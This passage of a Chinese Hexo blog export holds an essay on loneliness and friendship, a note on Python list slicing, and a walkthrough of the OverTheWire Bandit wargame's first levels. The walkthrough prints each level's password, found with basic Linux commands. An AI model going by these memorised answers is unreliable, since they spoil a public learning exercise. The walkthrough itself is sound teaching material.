title=\"感谢那些从你生命中消失的人\"></a>感谢那些从你生命中消失的人</h3><p>如果一定要对他们说句话，我其实想说谢谢。<br>无论我们当初怎么相识，又因何故分离，感谢你们当初的陪伴，也谢谢你们最后把时间还给了我。</p>\n<p>时间是我们的一生中唯一一个避不开的东西，无论我今天是什么样子，都是已经过去的每一分每一秒换来的。<br>这段时间里，我正在努力的变得更优秀一点，也期盼着遇见像当初的你们于当初的我来讲那样优秀迷人的人。</p>\n<p>我总是乐于承认自己不够优秀，也偶尔会被同样不够优秀的人拉住衣角问“你已经很好了，为什么还不知足？”<br><strong>停不下来也许是心虚吧，怕遇见更好的你，却不是配得上更好的你的自己。</strong>  </p>\n<h3 id=\"拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\"><a href=\"#拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\" class=\"headerlink\" title=\"拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\"></a>拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。</h3><p>举几个例子</p>\n<p>你害怕孤独，同时你喜欢一个人，但是你并没有优秀到对方可以凝望着你的脸庞眼神中充满了迷恋说出喜欢你的地步，你该怎么做？是选择一个喜欢你的人？还是让你喜欢的人也喜欢上你？  </p>\n<p>你害怕孤独，在你喜欢的和喜欢你的之间，你选择了后者。后者为了让你喜欢上自己不停的在努力。随着时间的推移，你如何保证在这个从未停止转动的世界里，喜欢你的人不会遇到比你更优秀的人？而对方又如何寄希望与你，让对方相信选择你是正确的，你对对方来说永远都是哪个特别的人？  </p>\n<p>你害怕孤独，你相信如果跟一个优秀的人在一起，一定会努力变成一个对他来说既特别又迷人的人。可优秀的人为什么要跟一个一眼就能从20岁看到70岁的人在一起？若你保证一定会为了对方也努力变成优秀的人，优秀的人时间成本很高，对方如何相信你有这样的能力以至于最后不是在浪费时间？  </p>\n<h3 id=\"孤独与时间\"><a href=\"#孤独与时间\" class=\"headerlink\" title=\"孤独与时间\"></a>孤独与时间</h3><p><strong>时间是唯一避不开的东西，而孤独与时间的组合可能是让你成长的最好的条件。</strong>  </p>\n<p>我们做什么事情都要花时间，谈恋爱，逛街，旅行，与朋友聊天，学习，健身，玩手机，发呆，睡觉，培养感情等等。<br>这么多的事情把我们每天的时间挤得满满的。父母担心打扰到你以至于每天9点以后才敢小心翼翼的打个电话问你是不是在忙，而你总是用一会还有事为理由挂断电话，但是接电话之前你却花了一个多小时刷微博，花了几十分钟在微信上跟没见过面的人从天涯聊到了海角，从海角聊到了海角七号。</p>\n<p>孤独是什么，孤独也许是你抛弃了上面的一部分事情后，因为时间处于空档而产生的感觉。<br>那孤独带来了什么？孤独带来了时间，时间的长短取决于你抛弃的事情会占用你多少时间，你抛弃的越多，你的待分配时间越多，相应的，你就会越孤独。</p>\n<p>孤独给了你重新分配时间的机会，让你有机会把时间分配到更应该分配的事情上面。<br>若你想谈恋爱，就把和朋友聊天的时间尽量压缩，很多人奇怪，为什么这么说，朋友难道不重要吗？如果你想每天都沉浸在人际交往里，我不反对你保持与朋友聊天这个习惯，如果你想谈了恋爱以后因没有时间提升自身而一直毫无进步，我也不反对。</p>\n<p><strong>若你把时间用在对未来有帮助的地方，我相信你自己会感谢你自己的，别着急。</strong></p>\n<hr>\n<h1 id=\"做一个The-One\"><a href=\"#做一个The-One\" class=\"headerlink\" title=\"做一个The One\"></a>做一个The One</h1><p>别相信年轻人的花言巧语，他们在甩你的时候跟当初决定在一起的时候抱着相同的决心。决定跟你在一起时对周围的人不削一顾，决定跟别人在一起的时候，你也一样会被不削一顾。硬要说有所区别，可能是你比其他的那些被不削一顾的人更让人讨厌吧。</p>\n<p>之前跟他人说起过，两个人在一起的根本原因是吸引。在一起的过程类似于你刚买了一个新的ipad，若ipad内的app一成不变，app的内容也一成不变，等你全看过了，也就不再那么感兴趣了，这时如果别人有一个新的ipad，里面的app也都是新的，我不确定所有人都能在有机会接触的情况下不去玩一玩新的。至少读这篇文章的你会忍不住。</p>\n<p>两个人想一直在一起，双方都应该是那个既吸引着对方又对对方来说是最特别的那个人。</p>\n<p>这个世界，优秀的人有很多，你不知道你喜欢的人有哪一点也吸引着这些人。而相比之下，你吸引人的那一点不一定比这些人迷人，即使是那一点同样吸引人，但是其他点你也很可能比不上他们。  </p>\n<p>若你每天在心里念叨着喜欢着那个人，但是你却未曾让自己变得更优秀，相信我，下辈子对方也不会回头看你一眼。在你停在原地的情况下，对方唯一可能喜欢你的机会是第一次遇见你时，那时的你在对方的心目中是最好的样子，不管是出丑还是擦肩都一样。而你已经失去这次机会了。若你明知如此，还是不努力，也还是念叨着喜欢对方，对不起，不光是你喜欢的人，你的朋友也会相继离开你。</p>\n<p><strong>试着做一个在对方眼里的 The One 也许你已经自然而然的成功了：）</strong></p>\n<p><strong>可替代性强的你，若是被抛弃了，不必伤心，本该如此的。</strong></p>\n<hr>\n<h1 id=\"朋友\"><a href=\"#朋友\" class=\"headerlink\" title=\"朋友\"></a>朋友</h1><p>你懂得这个世界总是拿价值去衡量一切，周围的人会不自觉的给你打上标签，来表明你是否有价值。读书的时候会看成绩，毕业了以后看薪资。<br>你有幸得到了一群朋友，他们不计较你的标签，他们很真诚的与你交流。你感到心里很温暖，觉得这真是上天给你的礼物。你很珍惜他们。但是你却不曾想过为他们创造什么价值。  </p>\n<p>若你仔细想想，因为他们是你的朋友，你应该为他们产生更多的价值，而不是每天喊着有你真好。喊三遍以后，可能就不太灵了。<br>你的朋友同样也会结识另一部分朋友，人的时间是有限的，若有些人能比你为他做的更多，而你除了先认识那个人以外毫无优势的话……可能更可怕的是你连时间优势都没有……<br>所以你曾经的一部分朋友离开了你。我不想说的这么现实，但是事实就是如此。</p>\n<p>那若我们现阶段无法创造直观的价值也不想就这样错过机会怎么办？这个问题跟创业公司找投资人拉投资是一样的——画饼。<br>对准投资人感兴趣的点，让对方看见你现在的状态，你需要的是什么，你的规划，你的行动力以及你的潜力。若你是投资人，前两种大部分人刚创业的人都差不多，而决定了对方能否给你信任的是你的规划，你的行动力和你的潜力。嗯，投资人是否感兴趣才是最后要特别提出来的，你再好没兴趣也不会有结果。</p>\n<p>是的，即使你天真到不愿相信这种复杂的感情能被量化到用另一种理念来代替，但总会有离开的人拎着棒子打醒你，告诉你你对他已经没有用了。</p>\n<p>若你的朋友进步很快，你还停在原地，你又想跟他们做朋友，若在对方眼里没有你对他有比山还高的恩情，你可能只有变得越来越优秀能互相创造更多的价值这一种途径了。  </p>\n<p><strong>不要和那些连看好你什么都不知道的人做朋友，因为你同样不知道对方离开的原因到底是什么。</strong>  </p>\n<hr>\n<h1 id=\"异性铁哥们\"><a href=\"#异性铁哥们\" class=\"headerlink\" title=\"异性铁哥们\"></a>异性铁哥们</h1><p>如果是我的异性铁哥们，我把所有的机会都给她去变得更迷人，让她在找到更好的人的路上，偶尔聊个天，关心一下，有时间大家一起出去疯一疯，异性铁哥们虽然类似同性铁哥们，但还是有区别的，伪娘都跟闺蜜擦枪走火了，你还能相信谁？</p>\n<p>就在那个被酒杯里的酒摇晃着的夜晚，就在又喝了一杯酒低头用力的咽下去又抬起头的那一刻，就那一瞬间，就那一眼望向你，就那头小鹿突然脚抽筋没站稳撞了下你铁哥们左心房……后面你脑补能力应该不比我差：）</p>\n<p>那些打算找个男女朋友的同时，还跟另一个异性打着铁哥们旗号，两个人满世界high的人，拜托省省吧。<br>你最后会发现，你并不需要男女朋友，除非你只是想找个牵手打kiss开房的人，而铁哥们你不敢这样做（不然这个铁哥们也变成你的男女朋友了）。  </p>\n<p>你思考了一下，觉得不应该用铁哥们做不到的事为目的来找男女朋友，应该是男女朋友做，如果男女朋友做不到的，铁哥们做。比如男女朋友陪着你满世界high，一个人没意思了，男女朋友又在忙，就去找铁哥们high。<br><strong>问题来了，这样的定义，跟备胎差多少呢？</strong><br><strong>你们的感情离其中一个人终于不敢寂寞还差多远呢？</strong><br><strong>你的铁哥们这么陪着你high，你究竟浪费了他多少的青春呢？</strong><br><strong>他把这些时间用在提升自己和自己的男女朋友身上，会不会让自己的感情状态更稳定，让自己更吸引人呢？</strong><br><strong>你这么无视他人的时间，是不是有点自私？</strong><br><strong>对方嘴上说着好啊好啊陪着你到处疯，难道真的不是因为喜欢你却又说不出口？</strong>   <strong>难道真的不是潜意识里觉得陪伴才是最长情的告白？</strong></p>\n<p>你说你了解你哥们，不会的，人家就是很闲。<br><strong>你确定他没有因为你推掉了之前安排好的时间？</strong><br><strong>而青春这个债，你最后要怎么还？</strong>  </p>\n<p><strong>最后一句，对不起？谢谢？</strong>  </p>\n<hr>\n<blockquote>\n<p>你又思考了一下，觉得我这个人有病。你能看到这，可能你也得吃点药。</p>\n</blockquote>"},{"title":"记python的一个坑","date":"2016-12-01T08:55:10.000Z","layout":"post","comments":1,"reward":true,"_content":"\n之前 python 的 server 出过一次问题，总是异常丢失数据。\n查日志也分析不出问题。\n\n![heirenwenhao](/Image/hei1.jpeg)\n\n<!--more-->\n很困扰，最后一层一层找，发现是数据库返回的数据有重复列，到python端因为采用的是 index + data 分开存的方式（index: {name:1, age:2}, data:{'zhangsan', 23} 这样的两个集合），两个重复列名会导致index的对应出问题（字典无法存在两个相同 key）。我的问题是 index 的索引值超出了 data 的长度。\n\n问题找到后，数据库端存储过程修改正确后这个奇怪的现象被我忽略了。\n后来今天看到了这么一段：\n> 以下代码将输出什么?\n```python\nlist = ['a', 'b', 'c', 'd', 'e']\nprint list[10:]\n```\n> 答案\n\n> 以上代码将`输出 []`，并且不会导致一个 IndexError。\n\n![heirenwenhao](/Image/hei2.jpeg)\n\n> 正如人们所期望的，试图访问一个超过列表索引值的成员将导致 IndexError（比如访问以上列表的 list[10]）。尽管如此，试图访问一个列表的以超出列表成员数作为开始索引的切片将不会导致 IndexError，并且将仅仅返回一个空列表。\n\n> **一个讨厌的小问题是它会导致出现 bug ，并且这个问题是难以追踪的，因为它在运行时不会引发错误。**\n\n这原来是面试题里的送分题……\n这就尴尬了……","source":"_posts/python_1.md","raw":"---\ntitle: 记python的一个坑\ndate: 2016-12-01 16:55:10\nlayout: post\ncomments: true\nreward: true\ntags:\n    - python\n    - 反人类\n---\n\n之前 python 的 server 出过一次问题，总是异常丢失数据。\n查日志也分析不出问题。\n\n![heirenwenhao](/Image/hei1.jpeg)\n\n<!--more-->\n很困扰，最后一层一层找，发现是数据库返回的数据有重复列，到python端因为采用的是 index + data 分开存的方式（index: {name:1, age:2}, data:{'zhangsan', 23} 这样的两个集合），两个重复列名会导致index的对应出问题（字典无法存在两个相同 key）。我的问题是 index 的索引值超出了 data 的长度。\n\n问题找到后，数据库端存储过程修改正确后这个奇怪的现象被我忽略了。\n后来今天看到了这么一段：\n> 以下代码将输出什么?\n```python\nlist = ['a', 'b', 'c', 'd', 'e']\nprint list[10:]\n```\n> 答案\n\n> 以上代码将`输出 []`，并且不会导致一个 IndexError。\n\n![heirenwenhao](/Image/hei2.jpeg)\n\n> 正如人们所期望的，试图访问一个超过列表索引值的成员将导致 IndexError（比如访问以上列表的 list[10]）。尽管如此，试图访问一个列表的以超出列表成员数作为开始索引的切片将不会导致 IndexError，并且将仅仅返回一个空列表。\n\n> **一个讨厌的小问题是它会导致出现 bug ，并且这个问题是难以追踪的，因为它在运行时不会引发错误。**\n\n这原来是面试题里的送分题……\n这就尴尬了……","slug":"python_1","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8b000dmkwblij1swrt","content":"<p>之前 python 的 server 出过一次问题，总是异常丢失数据。<br>查日志也分析不出问题。</p>\n<p><img src=\"/Image/hei1.jpeg\" alt=\"heirenwenhao\"></p>\n<a id=\"more\"></a>\n<p>很困扰，最后一层一层找，发现是数据库返回的数据有重复列，到python端因为采用的是 index + data 分开存的方式（index: {name:1, age:2}, data:{‘zhangsan’, 23} 这样的两个集合），两个重复列名会导致index的对应出问题（字典无法存在两个相同 key）。我的问题是 index 的索引值超出了 data 的长度。</p>\n<p>问题找到后，数据库端存储过程修改正确后这个奇怪的现象被我忽略了。<br>后来今天看到了这么一段：</p>\n<blockquote>\n<p>以下代码将输出什么?<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">list = [<span class=\"string\">'a'</span>, <span class=\"string\">'b'</span>, <span class=\"string\">'c'</span>, <span class=\"string\">'d'</span>, <span class=\"string\">'e'</span>]</div><div class=\"line\"><span class=\"keyword\">print</span> list[<span class=\"number\">10</span>:]</div></pre></td></tr></table></figure></p>\n<p>答案</p>\n<p>以上代码将<code>输出 []</code>，并且不会导致一个 IndexError。</p>\n</blockquote>\n<p><img src=\"/Image/hei2.jpeg\" alt=\"heirenwenhao\"></p>\n<blockquote>\n<p>正如人们所期望的，试图访问一个超过列表索引值的成员将导致 IndexError（比如访问以上列表的 list[10]）。尽管如此，试图访问一个列表的以超出列表成员数作为开始索引的切片将不会导致 IndexError，并且将仅仅返回一个空列表。</p>\n<p><strong>一个讨厌的小问题是它会导致出现 bug ，并且这个问题是难以追踪的，因为它在运行时不会引发错误。</strong></p>\n</blockquote>\n<p>这原来是面试题里的送分题……<br>这就尴尬了……</p>\n","site":{"data":{}},"excerpt":"<p>之前 python 的 server 出过一次问题，总是异常丢失数据。<br>查日志也分析不出问题。</p>\n<p><img src=\"/Image/hei1.jpeg\" alt=\"heirenwenhao\"></p>","more":"<p>很困扰，最后一层一层找，发现是数据库返回的数据有重复列，到python端因为采用的是 index + data 分开存的方式（index: {name:1, age:2}, data:{‘zhangsan’, 23} 这样的两个集合），两个重复列名会导致index的对应出问题（字典无法存在两个相同 key）。我的问题是 index 的索引值超出了 data 的长度。</p>\n<p>问题找到后，数据库端存储过程修改正确后这个奇怪的现象被我忽略了。<br>后来今天看到了这么一段：</p>\n<blockquote>\n<p>以下代码将输出什么?<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">list = [<span class=\"string\">'a'</span>, <span class=\"string\">'b'</span>, <span class=\"string\">'c'</span>, <span class=\"string\">'d'</span>, <span class=\"string\">'e'</span>]</div><div class=\"line\"><span class=\"keyword\">print</span> list[<span class=\"number\">10</span>:]</div></pre></td></tr></table></figure></p>\n<p>答案</p>\n<p>以上代码将<code>输出 []</code>，并且不会导致一个 IndexError。</p>\n</blockquote>\n<p><img src=\"/Image/hei2.jpeg\" alt=\"heirenwenhao\"></p>\n<blockquote>\n<p>正如人们所期望的，试图访问一个超过列表索引值的成员将导致 IndexError（比如访问以上列表的 list[10]）。尽管如此，试图访问一个列表的以超出列表成员数作为开始索引的切片将不会导致 IndexError，并且将仅仅返回一个空列表。</p>\n<p><strong>一个讨厌的小问题是它会导致出现 bug ，并且这个问题是难以追踪的，因为它在运行时不会引发错误。</strong></p>\n</blockquote>\n<p>这原来是面试题里的送分题……<br>这就尴尬了……</p>"},{"title":"「WarGame 系列」 Bandit","date":"2017-11-17T13:29:00.000Z","layout":"post","comments":1,"reward":true,"_content":"这次安利一个游戏。\n```sh\n _                     _ _ _   \n| |__   __ _ _ __   __| (_) |_ \n| '_ \\ / _` | '_ \\ / _` | | __|\n| |_) | (_| | | | | (_| | | |_ \n|_.__/ \\__,_|_| |_|\\__,_|_|\\__|\n```\n游戏呢是给初学者设计的，新手刚好可以一边过关一边学习一些 Linux 的基本操作。\n先说说这个游戏怎么玩吧：\n我们这个游戏有27关，对应27对账号密码组合。开始的时候送我们一个第一关的账号密码：「bandit0」-「bandit0」。\n我们需要使用这个账号登陆服务器并找到「bandit1」的密码，然后使用得到的密码登陆「bandit1」，再找到「bandit2」的密码……\n\n咦，等一下，这游戏怎么有种……「你追我，如果你追到我，我就让你嘿嘿嘿」的感觉呢……\n<!--more-->\n然而通关以后冰冷的现实告诉我：  \n![](/Image/bandit_resources/27CB93E553A707C15C1AB4DCFA52EFBA.jpg)\n……\n\n游戏呢，是需要自己动手玩的，这篇文章只是记录了我的通关思路和过程，可以参考，但也别无脑拷。\n下面的通关记录是在玩游戏的过程中边玩边记录的，所以比较正经，想上车的同学可以下车了～\n前几关写的比较细，也是考虑到新手一上来就看不懂很闹心，然后又要浪费蛋白质，嗯你懂的：）\n\n如果有好的思路，欢迎留言。\n\n# Bandit 游戏规则\n强盗战争是针对绝对的初学者。它会教授需要能够玩其他战争游戏的基础知识。\n\n……（剩下不翻译了，懒～\n\n\n\nLevel 0 \n\n两种姿势：1.终端直接 ssh 。2.看下面\n\nChrome 插件 「Secure Shell」\n\n![](/Image/bandit_resources/851073B8A9CDFA81ECB4F7719C7BDA39.jpg)\n\n按上图配置好各项后按「Enter」或点击「连接」\n\n![](/Image/bandit_resources/608E268171D41C5563D62EA2F9F30FDE.jpg)\n\n输入页面中告诉我们的密码：bandit0\n\n（输入密码时是隐式输入，光标不会动，不要以为卡了，正常输入后按回车等待反馈信息就好）\n\n![](/Image/bandit_resources/BE3283D120238F44FADC24C8EA3F5CB8.jpg)\n\n见到这个东西就证明我们使用 SSH 连接服务器成功了。我们就可以用手中的这台电脑操作这台服务器了。\n\n---\nLevel 0 - 1\n\n描述：下一级别的密码存储在位于主目录中的名为readme的文件中。使用此密码 SSH 登录到bandit1。\n密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1\n\n```sh\nbandit0@bandit:~$ ls\nreadme\nbandit0@bandit:~$ cat readme\nboJ9jbbUNNfktd78OOpsqOltutMc3MY1\n```\n\n心路历程：借上图中的红框，「~」表明我们登陆后的当前位置是该用户的主目录，`ls` 列出当前目录下的文件，发现确实有这个「readme」文件。使用 `cat` 命令打印出文件的内容。\n拿到这个所谓的密码之后，我们要使用 exit 命令退出这次登陆（直接刷新网页更快～）。\n\n```sh\nbandit0@bandit:~$ exit \nlogout\nConnection to bandit.labs.overthewire.org closed.\nNaCl 插件已退出，状态代码为：0。\n重新连接(&R)、选择其他连接(&C)或退出(&E)\n```\n\n这时我们输入 C，然后配置新的连接，使用新的用户名「bandit1」和密码「boJ9jbbUNNfktd78OOpsqOltutMc3MY1」登陆就ok了。\n提示：如果大家不知道去哪里查找命令的话，可以在终端中 `man 命令`，例如 `man ls`。天生英文抗性为负的朋友可以来这里查👉[Linux 命令大全](http://man.linuxde.net/)，但并不能完全取代 man 手册。\n\n---\n\nLevel 1 - 2\n\n描述：下一级别的密码存储在一个名为 - 位于主目录中的文件中。\n\n密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n\n```sh\nbandit1@bandit:~$ ls\n-\nbandit1@bandit:~$ cat ./-\nCV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n```\n\n心路历程：文件名是「-」，如果是其他名字直接 `cat filename` 就好了，然而如果是 `cat -` 的话，就有一些小问题，因为 bash 中会用「-」来接受命令行参数，未避免冲突，我们使用「./」来表示当前目录，那「-」文件就表示为「./-」。\n\n---\n\nLevel 2 - 3\n\n描述：下一级别的密码存储在位于主目录中的文件名含有「空格」的文件中\n\n密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\n```sh\nbandit2@bandit:~$ ls\nspaces in this filename\nbandit2@bandit:~$ ll\ntotal 28\ndrwxr-xr-x  3 bandit2 bandit2 4096 Nov 10 15:23 ./\ndrwxr-xr-x 30 root    root    4096 Nov 10 15:23 ../\n-rw-r--r--  1 bandit2 bandit2  220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit2 bandit2 3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit2 bandit2 4096 Nov 10 15:23 .cache/\n-rw-r--r--  1 bandit2 bandit2  675 Apr  9  2014 .profile\n-rw-r-----  1 bandit3 bandit2   33 Sep 28 14:04 spaces in this filename\nbandit2@bandit:~$ cat spaces\\ in\\ this\\ filename \nUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n```\n\n心路历程：这关使用 `ls` 后没办法确定文件的数量（1～4个），使用 `ll` 命令（`ls -alF`）查看一下发现是一个单独的文件（「.」开头的文件为隐藏文件，故之前没有显示）。这里的空格面临的情况跟之前的「-」差不多，避免混淆，使用「\\ 」（斜线后跟空格表示空格）。\n提示：`ll` 并不是 linux 的基本命令，而是「.bashrc」这个文件中的\n```bash\nalias ll='ls -alF'\n```\n这句话定义的。相当于对 `ls -alF` 这个命令起了一个别名。\n因为这个别名的定义较为普遍，所以我没看这个文件内容之前就习惯性的试了下。\n\n---\n\n\n\n```sh\nbandit3@bandit:~$ ls\ninhere\nbandit3@bandit:~$ cd inhere \nbandit3@bandit:~/inhere$ ls\nbandit3@bandit:~/inhere$ ll\ntotal 12\ndrwxr-xr-x 2 root    root    4096 Sep 28 14:04 ./\ndrwxr-xr-x 4 bandit3 bandit3 4096 Nov 10 15:42 ../\n-rw-r----- 1 bandit4 bandit3   33 Sep 28 14:04 .hidden\nbandit3@bandit:~/inhere$ cat .hidden \npIwrPrtPN36QITSp3EQaw936yaFoFgAB\n```\n\n心路历程：进入「inhere」目录后使用 `ls` 命令看不到非隐藏文件，我们使用 `ll` 就ok了。\n\n---\n\nLevel 4 -5\n\n描述：下一级别的密码存储在inhere目录中唯一的人类可读文件中。提示：如果你的终端搞砸了，试试“重置”命令。\n\n密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh\n\n```sh\nbandit4@bandit:~$ ls\ninhere\nbandit4@bandit:~$ cd inhere\nbandit4@bandit:~/inhere$ ls\n-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09\nbandit4@bandit:~/inhere$ file ./*\n./-file00: Non-ISO extended-ASCII text, with CR line terminators, with escape sequences\n./-file01: data\n./-file02: data\n./-file03: data\n./-file04: data\n./-file05: data\n./-file06: data\n./-file07: ASCII text\n./-file08: data\n./-file09: data\nbandit4@bandit:~/inhere$ cat ./-file07\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n```\n\n心路历程：因为描述中提到了这个文件是唯一人类可读的文件，大概率会与其他文件不太一样，我们选择使用 `file` 命令查看文件类型后发现只有一个 「ASCII text」文件，那基本就是它了。\n\n---\n\nLevel 5 - 6\n\n描述：下一级别的密码存储在inhere目录下的某个文件中，并具有以下所有属性： 人类可读，大小为1033字节，不可执行。\n\n密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7\n\n```sh\nbandit5@bandit:~$ ls\ninhere\nbandit5@bandit:~$ cd inhere; ll\ntotal 88\ndrwxr-x--- 22 root    bandit5 4096 Sep 28 14:04 ./\ndrwxr-xr-x  4 bandit5 bandit5 4096 Nov 11 06:01 ../\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere00/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere01/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere02/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere03/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere04/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere05/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere06/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere07/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere08/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere09/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere10/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere11/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere12/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere13/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere14/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere15/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere16/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere17/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere18/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere19/\nbandit5@bandit:~/inhere$ find . -type f -size 1033c\n./maybehere07/.file2\nbandit5@bandit:~/inhere$ cat ./maybehere07/.file2\nDXjZPULLxYr17uwoI01bNLQbtFemEgo7\n```\n\n心路历程：第二个命令 `cd inhere; ll` 两个命令通过分号间隔，会分别执行。我们发现 inhere 目录下还有好多目录（文件夹）。这如果一个一个找就累死了。我们使用 `find` 命令查找一下。`-type f`指定文件类型为普通文件，`-size 1033c` 指定文件大小为 1033 bytes。具体可参考我上面给出的 [Linux 命令大全](http://man.linuxde.net/)\n提示：`ls -l` 后每行开头的字符串中第一个字母是「d」表示为「directory」- 目录。我们使用的 `ll` 在 .bashrc 文件中被定义为 `ls -alF` 其中 `a` 是显示隐藏文件， `l` 是详细信息， `F` 是每条后面追加文件类型标识符，我们输出的每行内容尾部都有的「／」就表示这些都是目录。\n\n---\n\nLevel 6 - 7\n\n描述：下一级别的密码存储在服务器的某个位置，具有以下所有属性： 所属用户bandit7，所属用户组bandit6，拥有 33个字节的大小\n\n密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n\n```sh\nbandit6@bandit:~$ find / -group bandit6 -user bandit7 -size 33c 2>/dev/null\n/var/lib/dpkg/info/bandit7.password\nbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password\nHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n```\n\n心路历程：描述中说「存储在服务器的某个位置」，我们使用「／」这个 linux 根目录作为我们搜索的最顶层。其中我们还用到了 Linux 下的「黑洞」，把错误输入全扔了进去。这样就只返回了正确结果。\n如果把错误输出重定向到「黑洞」中，就是酱紫滴：  \n![IMAGE](/Image/bandit_resources/6672B54C1537E1423C2D857DA346FF5B.jpg)\n太多干扰信息不好观察。\n提示：「2>/dev/null」中「2」表示错误输出，「>」是重定向符号表示把信息送到哪里，「/dev/null」是「Linux黑洞」。这里有篇文章供参考👉[shell中>/dev/null 2>&1是什么鬼？](http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/)\n\n---\n\nLevel 7 - 8\n\n描述：下一级的密码存储文件data.txt中 “millionth” 的下一个单词。\n\n密码： cvX2JJa4CFALtqS87jk27qwqGhBM9plV\n\n```sh\nbandit7@bandit:~$ ll\ntotal 4112\ndrwxr-xr-x  3 bandit7 bandit7    4096 Nov 11 07:48 ./\ndrwxr-xr-x 30 root    root       4096 Nov 11 07:48 ../\n-rw-r--r--  1 bandit7 bandit7     220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit7 bandit7    3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit7 bandit7    4096 Nov 11 07:48 .cache/\n-rw-r--r--  1 bandit7 bandit7     675 Apr  9  2014 .profile\n-rw-r-----  1 bandit8 bandit7 4184396 Sep 28 14:04 data.txt\nbandit7@bandit:~$ grep millionth data.txt\nmillionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV\n```\n\n心路历程：我们查看文件详细内容时发现这个文件比较大，光靠肉眼找是没戏了。所以我们借助命令 `grep` 找到 「milionth」这个单词所在行的内容，后面跟着下一关的密码。（其实最开始我惯性的`ls` 然后 `cat` 了一下……发觉不太对赶紧 `ctrl+c` 终止， `ll` 看了眼大小……）\n\n---\n\nLevel 8 - 9\n\n描述：下一个级别的密码存储在文件data.txt中，并且是仅出现一次的文本行。\n\n密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n\n```sh\nbandit8@bandit:~$ ls\ndata.txt\nbandit8@bandit:~$ sort data.txt | uniq -u\nUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n```\n\n心路历程：又描述得知这是一个文本文件，里面有很多行字符串，我们需要找到其中仅出现一次的行。使用 `sort` 命令对文件排序后再对其结果进行 `uniq -u` 只显示其中的单一行。\n提示：uniq -u 是上下相邻两行对比得到是否为单一行：\n```bash\nbandit8@bandit:~$ echo -en \"1\\n1\\n2\\n1\\n\" >test.txt\nbandit8@bandit:~$ cat test.txt \n1\n1\n2\n1\nbandit8@bandit:~$ uniq -u test.txt \n2\n1\n```\n如例子中的前两行被认定为重复行，第二行与第三行不同，第三行与第四行不同，所以「2」被当作了唯一行。第四行中的「1」同理。\n所以我们这里要先对文件排序：\n```bash\nbandit8@bandit:~$ sort test.txt > sorted.txt; cat sorted.txt\n1\n1\n1\n2\n```\n然后再筛选唯一行：\n```bash\nbandit8@bandit:~$ uniq -u sorted.txt\n2\n```\n\n---\n\nLevel 9 - 10\n\n描述：下一个级别的密码存储在文件data.txt中的几个人类可读字符串之一，从几个“=”字符开始。\n\n密码：truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\n```sh\nbandit9@bandit:~$ ls\ndata.txt\nbandit9@bandit:~$ strings data.txt | grep ==\n|========== the\n========== password\n========== is\n========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n```\n\n心路历程：描述中提到了几个人类可读字符，那我们用 strings 筛选一下（strings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束）。其中也提到从几个「=」符号开始，那我们用 grep 命令筛选 含有「==」的字符串看看。\n\n---\n\nLevel 10 - 11\n\n描述：下一级别的密码存储在data.txt文件中，该文件包含base64编码数据\n\n密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n\n```sh\nbandit10@bandit:~$ ls\ndata.txt\nbandit10@bandit:~$ cat 